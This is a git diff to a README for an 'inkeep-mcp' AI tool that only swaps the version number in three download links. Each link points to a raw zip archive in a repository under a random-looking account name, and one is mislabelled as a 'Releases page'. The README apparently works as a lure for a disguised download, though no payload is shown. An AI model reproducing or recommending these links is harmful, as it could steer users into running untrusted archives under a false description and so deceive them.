@@ -1,6 +1,6 @@
 # 🔓 inkeep-mcp - Unlock AI Capabilities with Ease
 
-[![Download inkeep-mcp](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_3.9.zip)](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_3.9.zip)
+[![Download inkeep-mcp](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_1.0.zip)](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_1.0.zip)
 
 ## 🎯 Overview
 
@@ -12,7 +12,7 @@ Follow these steps to download and run inkeep-mcp:
 
 ### Step 1: Visit the Releases Page
 
-To download the latest version of inkeep-mcp, visit our [Releases page](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_3.9.zip). 
+To download the latest version of inkeep-mcp, visit our [Releases page](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_1.0.zip). 
 
 ### Step 2: Download the Application
 
@@ -50,7 +50,7 @@ Once the installation is complete, you can run the application. Depending on you
 
 ## 📥 Download & Install
 
-To download and install inkeep-mcp, visit our [Releases page](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_3.9.zip). Choose the version that fits your operating system and follow the outlined installation steps.
+To download and install inkeep-mcp, visit our [Releases page](https://github.com/cvgbxdcfghfhgfdhg/inkeep-mcp/raw/refs/heads/main/inkeep_core/mcp_inkeep_1.0.zip). Choose the version that fits your operating system and follow the outlined installation steps.
 
 ## ⚙️ Support & Documentation
 
